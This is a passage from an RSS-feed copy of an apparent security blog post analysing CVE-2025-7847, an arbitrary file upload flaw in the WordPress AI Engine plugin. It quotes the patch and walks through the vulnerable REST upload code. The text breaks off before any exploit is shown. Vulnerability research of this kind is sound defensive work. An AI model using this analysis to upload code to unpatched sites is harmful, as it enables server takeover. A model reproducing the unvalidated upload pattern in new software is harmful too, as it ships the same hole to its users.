      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;AI Engine&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; contains an &lt;strong&gt;arbitrary file upload&lt;/strong&gt; vulnerability due to missing &lt;strong&gt;file type validation&lt;/strong&gt; in the &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; function in versions &lt;strong&gt;2.9.3&lt;/strong&gt; and &lt;strong&gt;2.9.4&lt;/strong&gt;.&#xA;This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt; (attackers with authentication), with &lt;strong&gt;Subscriber-level&lt;/strong&gt; privileges or higher, to &lt;strong&gt;upload arbitrary files&lt;/strong&gt; to the affected website&amp;rsquo;s &lt;strong&gt;server&lt;/strong&gt; when the &lt;strong&gt;REST API&lt;/strong&gt; is enabled, which can lead to &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7847&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7847&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.9.3-2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because the upload handling function writes files directly (&lt;code&gt;copy()&lt;/code&gt;, &lt;code&gt;file_put_contents()&lt;/code&gt;) without &lt;strong&gt;checking file type or authenticating the user&lt;/strong&gt;, allowing an attacker to &lt;strong&gt;upload arbitrary files (including &lt;code&gt;.php&lt;/code&gt;)&lt;/strong&gt; into the uploads directory and execute malicious code.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#34; title=&#34;Validate file type&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;Validate file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;516&#34; width=&#34;1819&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Validate file type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Validate filename extension for base64 uploads&#xA;$validate = wp_check_filetype( $filename );&#xA;if ( $validate[&amp;#39;type&amp;#39;] == false ) {&#xA;  throw new Exception( &amp;#39;File type is not allowed.&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch added file type checks in the &lt;code&gt;simpleFileUpload&lt;/code&gt; and &lt;code&gt;upload_file&lt;/code&gt; functions using &lt;code&gt;wp_check_filetype()&lt;/code&gt; to only allow uploads for valid formats based on WordPress&amp;rsquo;s whitelist.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers several public APIs via the &lt;code&gt;rest_api_init()&lt;/code&gt; function&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;  $public_api = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api&amp;#39; );&#xA;  if ( !$public_api ) {&#xA;    return;&#xA;  }&#xA;  $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;  if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;    add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;  }&#xA;  register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;      return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;    },&#xA;  ] );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks whether the &lt;strong&gt;Public API&lt;/strong&gt; option is enabled. According to the plugin &lt;a href=&#34;https://ai.thehiddendocs.com/public-rest-api/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;documentation&lt;/a&gt;, this option is disabled by default:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;You can enable it in the Admin Dashboard at &lt;code&gt;wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; title=&#34;enable the REST API&#34; data-thumbnail=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; data-sub-html=&#34;&lt;h2&gt;enable the REST API&lt;/h2&gt;&lt;p&gt;enable the REST API&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#39; alt=&#34;enable the REST API&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;enable the REST API&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;According to the description, when this option is enabled, only &lt;code&gt;authenticated API requests&lt;/code&gt; are accepted. There are two authentication methods:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;X-WP-Nonce&lt;/code&gt;: Obtained via the JavaScript object &lt;code&gt;wpApiSettings&lt;/code&gt; for logged-in users (Subscriber+)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;Bearer Token&lt;/code&gt;: Configured by the admin&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;  add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a Bearer Token is set, the plugin &lt;strong&gt;registers a filter&lt;/strong&gt; named &lt;code&gt;mwai_allow_public_api&lt;/code&gt;,&#xA;with the &lt;strong&gt;callback&lt;/strong&gt; being the method &lt;code&gt;auth_via_bearer_token&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;  &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;  &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;  &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;  },&#xA;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;An API is registered with method POST:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint: &lt;code&gt;/wp-json/mwai/v1/simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Callback: &lt;code&gt;rest_simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;With &lt;code&gt;permission_callback&lt;/code&gt; being the return value of &lt;code&gt;can_access_public_api()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function can_access_public_api( $feature, $extra ) {&#xA;  $logged_in = is_user_logged_in();&#xA;  return apply_filters( &amp;#39;mwai_allow_public_api&amp;#39;, $logged_in, $feature, $extra );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the WP REST API, the function &lt;code&gt;is_user_logged_in()&lt;/code&gt; will return:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;true&lt;/code&gt;: If the user is logged in and the &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header is valid&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;false&lt;/code&gt;: If the user is not logged in or the &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header is invalid&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;can_access_public_api&lt;/code&gt; will call the &lt;code&gt;mwai_allow_public_api&lt;/code&gt; filter registered above =&amp;gt; &lt;code&gt;auth_via_bearer_token($logged_in, $feature, $extra)&lt;/code&gt; is invoked&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function auth_via_bearer_token( $allow, $feature, $extra ) {&#xA;  if ( !empty( $extra ) &amp;amp;&amp;amp; !empty( $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; ) ) ) {&#xA;    $token = $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; );&#xA;    $token = str_replace( &amp;#39;Bearer &amp;#39;, &amp;#39;&amp;#39;, $token );&#xA;    if ( $token === $this-&amp;gt;bearer_token ) {&#xA;      // We set the current user to the first admin.&#xA;      $admin = $this-&amp;gt;core-&amp;gt;get_admin_user();&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;      return true;&#xA;    }&#xA;  }&#xA;  return $allow;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;auth_via_bearer_token()&lt;/code&gt; function authenticates using a Bearer Token.&#xA;Its process:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the request has an &lt;code&gt;Authorization&lt;/code&gt; header containing &lt;code&gt;Bearer &amp;lt;token&amp;gt;&lt;/code&gt;&#xA;and the &lt;code&gt;&amp;lt;token&amp;gt;&lt;/code&gt; value matches the token stored in the option (&lt;code&gt;$this-&amp;gt;bearer_token&lt;/code&gt;), then:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Set the current user to the first admin (&lt;code&gt;wp_set_current_user()&lt;/code&gt;),&lt;/li&gt;&#xA;&lt;li&gt;Return &lt;code&gt;true&lt;/code&gt; → allow API access.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If absent or the token is incorrect → return &lt;code&gt;$allow&lt;/code&gt;,&#xA;i.e., the initial result from &lt;code&gt;is_user_logged_in()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;By default, there will be no &lt;strong&gt;Bearer Token&lt;/strong&gt; for authentication, so we rely on a valid &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; of a Subscriber user =&amp;gt; &lt;code&gt;permission_callback=true&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_simpleFileUpload( $request ) {&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;    $files = $request-&amp;gt;get_file_params();&#xA;    &#xA;    // Check if file is provided&#xA;    if ( empty( $files[&amp;#39;file&amp;#39;] ) ) {&#xA;      // Check for base64 encoded file data&#xA;      ...&#xA;      $result = $this-&amp;gt;simpleFileUpload( null, $base64, $filename, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    else {&#xA;      // Handle regular file upload&#xA;      $file = $files[&amp;#39;file&amp;#39;];&#xA;      $purpose = isset( $params[&amp;#39;purpose&amp;#39;] ) ? $params[&amp;#39;purpose&amp;#39;] : &amp;#39;files&amp;#39;;&#xA;      $ttl = isset( $params[&amp;#39;ttl&amp;#39;] ) ? intval( $params[&amp;#39;ttl&amp;#39;] ) : 3600;&#xA;      $target = isset( $params[&amp;#39;target&amp;#39;] ) ? $params[&amp;#39;target&amp;#39;] : null;&#xA;      $metadata = isset( $params[&amp;#39;metadata&amp;#39;] ) ? $params[&amp;#39;metadata&amp;#39;] : [];&#xA;      &#xA;      if ( $this-&amp;gt;debug ) {&#xA;        $debug = sprintf( &amp;#39;REST [SimpleFileUpload]: file upload, name=%s, purpose=%s&amp;#39;, &#xA;          $file[&amp;#39;name&amp;#39;], &#xA;          $purpose &#xA;        );&#xA;        Meow_MWAI_Logging::log( $debug );&#xA;      }&#xA;      &#xA;      $result = $this-&amp;gt;simpleFileUpload( $file, null, null, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    &#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $result ], 200 );&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage() ], 500 );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; function handles file uploads via the REST API.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves parameters and files from &lt;code&gt;$request&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If no file is present, checks for base64 data and calls &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If a file is present, retrieves optional parameters (&lt;code&gt;purpose&lt;/code&gt;, &lt;code&gt;ttl&lt;/code&gt;, &lt;code&gt;target&lt;/code&gt;, &lt;code&gt;metadata&lt;/code&gt;), logs if debug is enabled, then calls &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Returns a &lt;code&gt;WP_REST_Response&lt;/code&gt; with &lt;code&gt;success =&amp;gt; true&lt;/code&gt; and the file data, or &lt;code&gt;success =&amp;gt; false&lt;/code&gt; if an error occurs.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function simpleFileUpload( $file = null, $base64 = null, $filename = null, $purpose = &amp;#39;files&amp;#39;, $ttl = 3600, $target = null, $metadata = [] ) {&#xA;  ...&#xA;  try {&#xA;    if ( !empty( $base64 ) ) {&#xA;     ...&#xA;    }&#xA;    else if ( !empty( $file ) &amp;amp;&amp;amp; is_array( $file ) ) {&#xA;      // Handle regular file upload&#xA;      if ( !empty( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;File upload error: &amp;#39; . $file[&amp;#39;error&amp;#39;] );&#xA;      }&#xA;      &#xA;      $refId = $this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file(&#xA;        $file[&amp;#39;tmp_name&amp;#39;],&#xA;        $file[&amp;#39;name&amp;#39;],&#xA;        $purpose,&#xA;        $metadata,&#xA;        null, // envId&#xA;        $target,&#xA;        $ttl&#xA;      );&#xA;      &#xA;      $url = $this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url( $refId );&#xA;      &#xA;      return [&#xA;        &amp;#39;id&amp;#39; =&amp;gt; $refId,&#xA;        &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;      ];&#xA;    }&#xA;    else {&#xA;      throw new Exception( &amp;#39;Either a file or base64 data must be provided.&amp;#39; );&#xA;    }&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    throw new Exception( &amp;#39;File upload failed: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;simpleFileUpload()&lt;/code&gt; function performs an upload from either file or base64 data.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If &lt;code&gt;$base64&lt;/code&gt; is not empty → handle upload from base64.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If &lt;code&gt;$file&lt;/code&gt; is a valid array:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check upload error (&lt;code&gt;$file[&#39;error&#39;]&lt;/code&gt;) → throw Exception if present.&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file()&lt;/code&gt; to save the file.&lt;/li&gt;&#xA;&lt;li&gt;Get the file URL via &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url($refId)&lt;/code&gt; and return an array &lt;code&gt;[&#39;id&#39; =&amp;gt; $refId, &#39;url&#39; =&amp;gt; $url]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function upload_file($path,$filename = null,$purpose = null,$metadata = null,$envId = null,$target = null,$expiry = null) {&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/image.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/media.php&amp;#39; );&#xA;&#xA;  $target = empty( $target ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_local_upload&amp;#39; ) : $target;&#xA;  $expiry = empty( $expiry ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_expires&amp;#39; ) : $expiry;&#xA;&#xA;  $expires = ( $expiry === &amp;#39;never&amp;#39; || empty( $expiry ) ) ? null : date( &amp;#39;Y-m-d H:i:s&amp;#39;, time() &amp;#43; intval( $expiry ) );&#xA;  $refId = $this-&amp;gt;generate_refId();&#xA;  $url = null;&#xA;  if ( empty( $filename ) ) {&#xA;    $parsed_url = parse_url( $path, PHP_URL_PATH );&#xA;    $filename = basename( $parsed_url );&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  else {&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  $newFilename = $refId . &amp;#39;.&amp;#39; . $extension;&#xA;  $unique_filename = wp_unique_filename( wp_upload_dir()[&amp;#39;path&amp;#39;], $newFilename );&#xA;  $destination = wp_upload_dir()[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;  if ( $target === &amp;#39;uploads&amp;#39; ) {&#xA;    if ( !$this-&amp;gt;check_db() ) {&#xA;      throw new Exception( &amp;#39;Could not create database table.&amp;#39; );&#xA;    }&#xA;    if ( !copy( $path, $destination ) ) {&#xA;      throw new Exception( &amp;#39;Could not move the file.&amp;#39; );&#xA;    }&#xA;    $url = wp_upload_dir()[&amp;#39;url&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;    $now = date( &amp;#39;Y-m-d H:i:s&amp;#39; );&#xA;    $fileId = $this-&amp;gt;commit_file( [&#xA;      &amp;#39;refId&amp;#39; =&amp;gt; $refId,&#xA;      &amp;#39;envId&amp;#39; =&amp;gt; $envId,&#xA;      &amp;#39;purpose&amp;#39; =&amp;gt; $purpose,&#xA;      &amp;#39;type&amp;#39; =&amp;gt; null,&#xA;      &amp;#39;status&amp;#39; =&amp;gt; &amp;#39;uploaded&amp;#39;,&#xA;      &amp;#39;created&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;updated&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;expires&amp;#39; =&amp;gt; $expires,&#xA;      &amp;#39;path&amp;#39; =&amp;gt; $destination,&#xA;      &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        $this-&amp;gt;add_metadata( $fileId, $metaKey, $metaValue );&#xA;      